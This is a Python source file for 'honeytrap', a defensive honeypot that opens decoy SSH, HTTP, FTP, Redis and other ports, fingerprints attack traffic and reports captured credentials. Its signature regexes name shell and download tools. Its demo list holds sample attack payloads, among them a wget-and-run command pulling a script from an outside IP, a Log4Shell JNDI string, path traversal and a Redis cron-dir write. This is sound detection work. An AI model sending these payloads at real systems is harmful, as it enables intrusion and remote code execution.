#!/usr/bin/env python3
"""
honeytrap: a low-interaction honeypot that lures attackers and records everything.

It opens decoy services (SSH, HTTP, FTP, Telnet, Redis, MySQL) that look real but do
nothing except log every connection, fingerprint the attacker, and raise alerts on
known attack patterns (credential stuffing, scanners, exploit strings, botnet probes).

Nothing is ever executed. honeytrap only listens and records — it is safe to run on a
host you own (ideally an isolated VM / cloud box) to study real attack traffic.

    python3 honeytrap.py                 # listen on the default decoy ports
    python3 honeytrap.py --report out.html
    python3 honeytrap.py --demo          # replay simulated attacks (no network)

Author: Martin Ivanov (Martun1) | License: MIT | Python 3.10+, standard library only
"""
from __future__ import annotations

import argparse
import asyncio
import html
import json
import re
import signal
import socket
import sys
from collections import Counter, defaultdict
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone

__version__ = "1.0.0"


class C:
    R, G, Y, B, M, CY, BD, DM, X = ("\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[95m",
                                    "\033[96m", "\033[1m", "\033[2m", "\033[0m")

    @classmethod
    def off(cls):
        for k in ("R", "G", "Y", "B", "M", "CY", "BD", "DM", "X"):
            setattr(cls, k, "")


# --------------------------------------------------------------------------- #
#  Decoy service definitions: (name, banner-first?, banner bytes, response fn)
# --------------------------------------------------------------------------- #
def http_response(data: bytes) -> bytes:
    return (b"HTTP/1.1 401 Unauthorized\r\nServer: Apache/2.4.41 (Ubuntu)\r\n"
            b"WWW-Authenticate: Basic realm=\"Admin\"\r\nContent-Length: 13\r\n\r\nAccess denied")


DECOYS = {
    21: {"name": "ftp", "banner": b"220 (vsFTPd 3.0.3)\r\n", "reply": b"530 Login incorrect.\r\n"},
    22: {"name": "ssh", "banner": b"SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5\r\n", "reply": b""},
    23: {"name": "telnet", "banner": b"\xff\xfd\x18\xff\xfd\x20Ubuntu 20.04 LTS\r\nlogin: ", "reply": b"Password: "},
    80: {"name": "http", "banner": b"", "reply": http_response},
    3306: {"name": "mysql", "banner": b"J\x00\x00\x00\n5.7.33-log\x00", "reply": b"\xff\x15\x04#28000Access denied"},
    6379: {"name": "redis", "banner": b"", "reply": b"-NOAUTH Authentication required.\r\n"},
    8080: {"name": "http-alt", "banner": b"", "reply": http_response},
}

# --------------------------------------------------------------------------- #
#  Attack fingerprinting
# --------------------------------------------------------------------------- #
SIGNATURES = [
    ("CRITICAL", "Log4Shell (CVE-2021-44228)", re.compile(rb"\$\{jndi:", re.I)),
    ("CRITICAL", "Shellshock (CVE-2014-6271)", re.compile(rb"\(\)\s*\{\s*:;\s*\}")),
    ("CRITICAL", "path traversal", re.compile(rb"\.\./\.\./|/etc/passwd|\.\.%2f", re.I)),
    ("HIGH", "SQL injection", re.compile(rb"union\s+select|or\s+1=1|'--|sleep\(", re.I)),
    ("HIGH", "command injection", re.compile(rb";\s*(wget|curl|nc|bash|sh)\s|/bin/sh|cmd\.exe", re.I)),
    ("HIGH", "webshell upload", re.compile(rb"eval\(|base64_decode\(|system\(\$", re.I)),
    ("HIGH", "default/weak credentials", re.compile(rb"root:root|admin:admin|user admin|USER root", re.I)),
    ("MEDIUM", "scanner tool", re.compile(rb"nmap|masscan|zgrab|nikto|sqlmap|gobuster|hydra|dirbuster", re.I)),
    ("MEDIUM", "router/IoT botnet probe", re.compile(rb"/shell\?|/cgi-bin/|GponForm|/boaform|setup\.cgi", re.I)),
    ("MEDIUM", "git/env exposure probe", re.compile(rb"/\.git/|/\.env|/wp-login|/phpmyadmin", re.I)),
    ("HIGH", "Redis unauth RCE attempt", re.compile(rb"CONFIG\s+SET\s+dir|SLAVEOF|module\s+load", re.I)),
    ("LOW", "crypto-miner config pull", re.compile(rb"xmrig|minerd|stratum\+tcp", re.I)),
]


@dataclass
class Event:
    ts: str
    src_ip: str
    src_port: int
    service: str
    dst_port: int
    bytes_in: int
    preview: str
    alerts: list[dict] = field(default_factory=list)


@dataclass
class Stats:
    events: list[Event] = field(default_factory=list)
    by_ip: Counter = field(default_factory=Counter)
    by_service: Counter = field(default_factory=Counter)
    by_alert: Counter = field(default_factory=Counter)
    credentials: list[str] = field(default_factory=list)
    start: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())


SEV_C = {"CRITICAL": "M", "HIGH": "R", "MEDIUM": "Y", "LOW": "B", "INFO": "DM"}
CRED_PAIR = re.compile(rb"\b([a-z0-9._-]{2,24}):([a-z0-9._@!$-]{2,24})\b")
CRED_FIELD = re.compile(rb"(?:^|\s)(?:USER|PASS|login|password)\s*[:=]?\s+([a-z0-9._@!$-]{2,24})", re.I)


def fingerprint(data: bytes, service: str) -> list[dict]:
    alerts = []
    for sev, name, rx in SIGNATURES:
        if rx.search(data):
            alerts.append({"severity": sev, "name": name})
    return alerts


def preview(data: bytes, n: int = 120) -> str:
    text = data[:n].decode("utf-8", "replace")
    return re.sub(r"[\x00-\x08\x0b-\x1f\x7f-\x9f]", ".", text).replace("\r", " ").replace("\n", " ").strip()


# --------------------------------------------------------------------------- #
#  Server
# --------------------------------------------------------------------------- #
class Honeytrap:
    def __init__(self, stats: Stats, quiet: bool = False):
        self.stats = stats
        self.quiet = quiet

    def log_event(self, ev: Event):
        self.stats.events.append(ev)
        self.stats.by_ip[ev.src_ip] += 1
        self.stats.by_service[ev.service] += 1
        for a in ev.alerts:
            self.stats.by_alert[a["name"]] += 1
        if self.quiet:
            return
        when = ev.ts[11:19]
        tag = (f"{getattr(C, SEV_C[ev.alerts[0]['severity']])}⚠ {ev.alerts[0]['name']}{C.X}"
               if ev.alerts else f"{C.DM}connection{C.X}")
        print(f"  {C.DM}{when}{C.X} {C.CY}{ev.src_ip:<15}{C.X} {C.BD}{ev.service:<9}{C.X} :{ev.dst_port:<5} "
              f"{tag}  {C.DM}{ev.preview[:50]}{C.X}")

    def handle(self, dst_port: int, decoy: dict):
        async def cb(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
            peer = writer.get_extra_info("peername") or ("?", 0)
            data = b""
            try:
                if decoy["banner"]:
                    writer.write(decoy["banner"])
                    await writer.drain()
                try:
                    data = await asyncio.wait_for(reader.read(4096), timeout=6)
                except asyncio.TimeoutError:
                    pass
                if data:
                    reply = decoy["reply"]
                    writer.write(reply(data) if callable(reply) else reply)
                    await writer.drain()
                    # a second read captures credential attempts after the prompt
                    try:
                        more = await asyncio.wait_for(reader.read(4096), timeout=4)
                        data += more
                    except asyncio.TimeoutError:
                        pass
            except (ConnectionError, OSError):
                pass
            finally:
                try:
                    writer.close()
                except OSError:
                    pass
            self.record(peer[0], peer[1], decoy["name"], dst_port, data)
        return cb

    def record(self, ip: str, port: int, service: str, dst_port: int, data: bytes):
        alerts = fingerprint(data, service)
        order = ["CRITICAL", "HIGH", "MEDIUM", "LOW"]
        alerts.sort(key=lambda a: order.index(a["severity"]))
        found = []
        for u, pw in CRED_PAIR.findall(data):
            pair = f"{u.decode('utf-8','replace')}:{pw.decode('utf-8','replace')}"
            if not pair.lower().startswith(("user-", "content-", "http", "mozilla", "jndi", "ldap", "tcp", "stratum", "slaveof")):
                found.append(pair)
        for m in CRED_FIELD.findall(data):
            c = m.decode("utf-8", "replace")
            if c.lower() not in ("agent", "length", "type"):
                found.append(c)
        for c in found[:4]:
            self.stats.credentials.append(f"{service}:{ip} -> {c}")
        ev = Event(datetime.now(timezone.utc).isoformat(), ip, port, service, dst_port, len(data), preview(data), alerts)
        self.log_event(ev)

    async def serve(self, ports: dict[int, dict]):
        servers = []
        for p, decoy in ports.items():
            try:
                servers.append(await asyncio.start_server(self.handle(p, decoy), "0.0.0.0", p))
                print(f"  {C.G}●{C.X} {decoy['name']:<9} decoy listening on 0.0.0.0:{p}")
            except OSError as e:
                print(f"  {C.R}○{C.X} {decoy['name']:<9} port {p} unavailable ({e.strerror})"
                      + (f" {C.DM}(try sudo, or --ports to pick high ports){C.X}" if p < 1024 else ""))
        if not servers:
            print(f"\n  {C.Y}No decoys could bind. On Linux, ports < 1024 need root — "
                  f"run with sudo or use --ports 2222,8080,...{C.X}")
            return
        print(f"\n  {C.BD}honeytrap v{__version__} armed.{C.X} {C.DM}Waiting for attackers… Ctrl+C to stop.{C.X}\n")
        await asyncio.gather(*(s.serve_forever() for s in servers))


# --------------------------------------------------------------------------- #
#  Reporting
# --------------------------------------------------------------------------- #
def summary(stats: Stats):
    print(f"\n  {C.BD}── Session summary ──{C.X}")
    print(f"  {C.BD}{len(stats.events)}{C.X} interactions from {C.BD}{len(stats.by_ip)}{C.X} unique IP(s)")
    if stats.by_ip:
        print(f"  {C.BD}Top attackers:{C.X}")
        for ip, n in stats.by_ip.most_common(5):
            print(f"    {C.CY}{ip:<16}{C.X} {n} hits")
    if stats.by_alert:
        print(f"  {C.BD}Attacks seen:{C.X}")
        for name, n in stats.by_alert.most_common():
            print(f"    {C.R}{n:>3}×{C.X} {name}")
    if stats.credentials:
        print(f"  {C.BD}Credentials tried:{C.X} {C.DM}{', '.join(stats.credentials[:8])}{C.X}")
    print()


def write_html(path, stats: Stats):
    scol = {"CRITICAL": "#a855f7", "HIGH": "#ef4444", "MEDIUM": "#f59e0b", "LOW": "#3b82f6", "INFO": "#64748b"}
    tiles = ""
    for label, val in [("Interactions", len(stats.events)), ("Unique IPs", len(stats.by_ip)),
                       ("Alerts", sum(stats.by_alert.values())), ("Creds tried", len(stats.credentials))]:
        tiles += f"<div class='tile'><b>{val}</b>{label}</div>"
    offenders = "".join(f"<div class='row'><code>{html.escape(ip)}</code><div class='bar'><i style='width:"
                        f"{100 * n // max(stats.by_ip.values() or [1])}%'></i></div><b>{n}</b></div>"
                        for ip, n in stats.by_ip.most_common(8))
    alerts = "".join(f"<li><b>{n}×</b> {html.escape(name)}</li>" for name, n in stats.by_alert.most_common()) or "<li>none</li>"
    rows = ""
    for e in reversed(stats.events[-250:]):
        a = (f"<span class='sev' style='background:{scol[e.alerts[0]['severity']]}'>{e.alerts[0]['name']}</span>"
             if e.alerts else "")
        rows += (f"<tr><td>{e.ts[11:19]}</td><td><code>{html.escape(e.src_ip)}</code></td><td>{e.service}</td>"
                 f"<td>{e.dst_port}</td><td>{a}</td><td><code>{html.escape(e.preview[:70])}</code></td></tr>")
    creds = "".join(f"<li><code>{html.escape(c)}</code></li>" for c in stats.credentials[:30]) or "<li>none captured</li>"
    path.write_text(f"""<!DOCTYPE html><html lang=en><head><meta charset=utf-8><title>honeytrap report</title><style>
body{{margin:0;background:#0a0e17;color:#e5e7eb;font-family:Inter,Segoe UI,system-ui,sans-serif;padding:30px}}
.w{{max-width:1150px;margin:auto}}h1{{margin:0}}.sub{{color:#8b98b4;margin-bottom:20px}}
.grid{{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin:18px 0}}
.tile{{background:#111827;border:1px solid #1f2937;border-radius:12px;padding:16px;color:#8b98b4;font-size:13px}}
.tile b{{display:block;font-size:30px;color:#fbbf24}}.two{{display:grid;grid-template-columns:1fr 1fr;gap:14px}}
.card{{background:#111827;border:1px solid #1f2937;border-radius:12px;padding:18px;margin-bottom:14px}}
.row{{display:grid;grid-template-columns:140px 1fr 40px;gap:10px;align-items:center;margin:7px 0}}
.bar{{height:9px;background:#1f2937;border-radius:5px;overflow:hidden}}.bar i{{display:block;height:100%;background:linear-gradient(90deg,#f59e0b,#ef4444)}}
table{{width:100%;border-collapse:collapse;font-size:12.5px}}td,th{{padding:7px;border-bottom:1px solid #1f2937;text-align:left}}
th{{color:#8b98b4}}code{{color:#7dd3fc}}.sev{{color:#fff;font-size:11px;font-weight:700;padding:2px 7px;border-radius:5px}}
h3{{margin:0 0 10px}}ul{{margin:0;padding-left:18px;line-height:1.7}}🍯</style></head><body><div class=w>
<h1>🍯 honeytrap report</h1><div class=sub>{len(stats.events)} interactions · since {stats.start[:19]} · v{__version__}</div>
<div class=grid>{tiles}</div><div class=two>
<div class=card><h3>Top attackers</h3>{offenders or '<div class=sub>none</div>'}</div>
<div class=card><h3>Attacks observed</h3><ul>{alerts}</ul><h3 style='margin-top:14px'>Credentials tried</h3><ul>{creds}</ul></div>
</div><div class=card><h3>Recent interactions</h3><table><tr><th>Time</th><th>Source</th><th>Service</th><th>Port</th><th>Alert</th><th>Payload</th></tr>{rows}</table></div>
</div></body></html>""", encoding="utf-8")
    print(f"  {C.G}[+]{C.X} HTML report → {path}")


# --------------------------------------------------------------------------- #
#  Demo mode (no real network): replay simulated attacks
# --------------------------------------------------------------------------- #
DEMO_ATTACKS = [
    ("45.134.26.7", "ssh", 22, b"SSH-2.0-libssh2_1.9.0\r\nroot:root\r\n"),
    ("45.134.26.7", "ssh", 22, b"SSH-2.0-libssh2_1.9.0\r\nadmin:admin\r\n"),
    ("185.220.101.5", "http", 80, b"GET /.env HTTP/1.1\r\nUser-Agent: python-requests/2.28\r\n\r\n"),
    ("185.220.101.5", "http", 80, b"GET /.git/config HTTP/1.1\r\n\r\n"),
    ("103.82.241.9", "http", 80, b"GET /products?id=1 UNION SELECT user,pass FROM users-- HTTP/1.1\r\n"),
    ("103.82.241.9", "http", 80, b"GET /index.php?page=../../../../etc/passwd HTTP/1.1\r\n"),
    ("91.240.118.3", "http", 8080, b"${jndi:ldap://91.240.118.3/a} User-Agent in header (Log4Shell)"),
    ("20.47.12.88", "http", 80, b"GET / HTTP/1.1\r\nUser-Agent: Mozilla/5.0 zgrab/0.x\r\n\r\n"),
    ("20.47.12.88", "http", 80, b"GET /boaform/admin/formLogin HTTP/1.1\r\n"),
    ("212.70.149.4", "ftp", 21, b"USER root\r\nPASS toor\r\n"),
    ("212.70.149.4", "redis", 6379, b"CONFIG SET dir /var/spool/cron\r\n"),
    ("159.65.0.11", "http", 80, b"GET /shell?cd+/tmp;wget+http://159.65.0.11/x.sh;sh+x.sh HTTP/1.1\r\n"),
    ("45.134.26.7", "ssh", 22, b"SSH-2.0-Go\r\nuser: oracle pass: oracle123\r\n"),
    ("185.220.101.5", "http", 80, b"GET /wp-login.php HTTP/1.1\r\nUser-Agent: WPScan v3\r\n\r\n"),
]


def run_demo(stats: Stats, quiet: bool):
    ht = Honeytrap(stats, quiet)
    print(f"\n  {C.BD}{C.CY}🍯 honeytrap v{__version__}{C.X} {C.DM}— demo mode (replaying simulated attacks){C.X}\n")
    import time
    for ip, service, port, data in DEMO_ATTACKS:
        ht.record(ip, port, service, port, data)
        if not quiet:
            time.sleep(0.08)


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(prog="honeytrap", description="Low-interaction honeypot that logs & fingerprints attackers")
    ap.add_argument("--ports", help="comma list of ports to open (default: standard decoy set)")
    ap.add_argument("--report", type=lambda s: __import__("pathlib").Path(s), help="write an HTML report on exit")
    ap.add_argument("--json", type=lambda s: __import__("pathlib").Path(s), help="append events as JSON on exit")
    ap.add_argument("--demo", action="store_true", help="replay simulated attacks (no network, for testing)")
    ap.add_argument("--quiet", action="store_true", help="don't print each event")
    ap.add_argument("--no-color", action="store_true")
    a = ap.parse_args(argv)
    if a.no_color or not sys.stdout.isatty():
        pass
    if a.no_color:
        C.off()

    ports = DECOYS
    if a.ports:
        want = [int(p) for p in a.ports.split(",")]
        ports = {p: DECOYS.get(p, {"name": f"port{p}", "banner": b"", "reply": b""}) for p in want}

    stats = Stats()
    if a.demo:
        run_demo(stats, a.quiet)
    else:
        print(f"\n  {C.BD}{C.CY}🍯 honeytrap v{__version__}{C.X}\n")
        ht = Honeytrap(stats, a.quiet)
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(ht.serve(ports))
        except KeyboardInterrupt:
            print(f"\n  {C.Y}stopping…{C.X}")
        finally:
            loop.close()
    summary(stats)
    if a.report:
        write_html(a.report, stats)
    if a.json:
        a.json.write_text(json.dumps([asdict(e) for e in stats.events], indent=2))
        print(f"  {C.G}[+]{C.X} JSON → {a.json}")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
